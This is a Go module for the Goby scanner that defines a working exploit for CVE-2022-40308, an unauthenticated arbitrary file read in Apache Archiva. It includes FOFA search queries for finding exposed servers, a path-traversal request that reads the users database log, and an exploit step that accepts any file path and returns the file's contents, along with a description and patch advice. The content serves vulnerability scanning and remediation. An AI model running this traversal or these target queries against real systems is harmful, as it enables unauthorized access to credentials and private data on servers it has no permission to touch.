package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Apache Archiva RepositoryServlet internal Arbitrary File Read (CVE-2022-40308)",
    "Description": "<p>Apache Archiva is a set of software used by the Apache Foundation of the United States to manage one or more remote storages. The software provides features such as remote Repository agents, secure role-based access management, and usage reporting.</p><p>Versions prior to Apache Archiva 2.2.9 have a security vulnerability, which stems from the ability to read database files directly without logging in if anonymous reading is enabled.</p>",
    "Product": "APACHE-Archiva",
    "Homepage": "http://archiva.apache.org/",
    "DisclosureDate": "2022-12-24",
    "Author": "csca",
    "FofaQuery": "title=\"Apache Archiva\" || body=\"/archiva.js\" || body=\"/archiva.css\"",
    "GobyQuery": "title=\"Apache Archiva\" || body=\"/archiva.js\" || body=\"/archiva.css\"",
    "Level": "2",
    "Impact": "<p>Versions prior to Apache Archiva 2.2.9 have a security vulnerability, which stems from the ability to read database files directly without logging in if anonymous reading is enabled.</p>",
    "Recommendation": "<p>1. Turn off the anonymous reading function. 2. At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://lists.apache.org/thread/x01pnn0jjsw512cscxsbxzrjmz64n4cc\">https://lists.apache.org/thread/x01pnn0jjsw512cscxsbxzrjmz64n4cc</a></p>",
    "References": [
        "https://xz.aliyun.com/t/11979"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "/data/databases/users/log/log1.dat",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/repository/internal/..//../data/databases/users/log/log1.dat",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "AS SEARCHABLE, T10 AS UNSIGNED_ATTRIBUTE",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "application/octet-stream",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/repository/internal/..//..{{{filePath}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2022-40308"
    ],
    "CNNVD": [
        "CNNVD-202211-2857"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Apache Archiva RepositoryServlet 代理功能 internal 文件任意文件读取漏洞（CVE-2022-40308）",
            "Product": "APACHE-Archiva",
            "Description": "<p>Apache Archiva是美国阿帕奇（Apache）基金会的一套用于管理一个或多个远程存储的软件。该软件提供远程Repository代理、基于角色的安全访问管理和使用情况报告等功能。<br></p><p>Apache Archiva 2.2.9之前版本存在安全漏洞，该漏洞源于如果启用了匿名读取，则无需登录即可直接读取数据库文件。<br></p>",
            "Recommendation": "<p>1、关闭匿名读取功能。2、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://lists.apache.org/thread/x01pnn0jjsw512cscxsbxzrjmz64n4cc\">https://lists.apache.org/thread/x01pnn0jjsw512cscxsbxzrjmz64n4cc</a><br></p>",
            "Impact": "<p>Apache Archiva 2.2.9之前版本存在安全漏洞，该漏洞源于如果启用了匿名读取，则无需登录即可直接读取数据库文件。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Apache Archiva RepositoryServlet internal Arbitrary File Read (CVE-2022-40308)",
            "Product": "APACHE-Archiva",
            "Description": "<p>Apache Archiva is a set of software used by the Apache Foundation of the United States to manage one or more remote storages. The software provides features such as remote Repository agents, secure role-based access management, and usage reporting.</p><p>Versions prior to Apache Archiva 2.2.9 have a security vulnerability, which stems from the ability to read database files directly without logging in if anonymous reading is enabled.<br></p>",
            "Recommendation": "<p>1. Turn off the anonymous reading function. 2. At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://lists.apache.org/thread/x01pnn0jjsw512cscxsbxzrjmz64n4cc\">https://lists.apache.org/thread/x01pnn0jjsw512cscxsbxzrjmz64n4cc</a><br></p>",
            "Impact": "<p>Versions prior to Apache Archiva 2.2.9 have a security vulnerability, which stems from the ability to read database files directly without logging in if anonymous reading is enabled.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10781"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}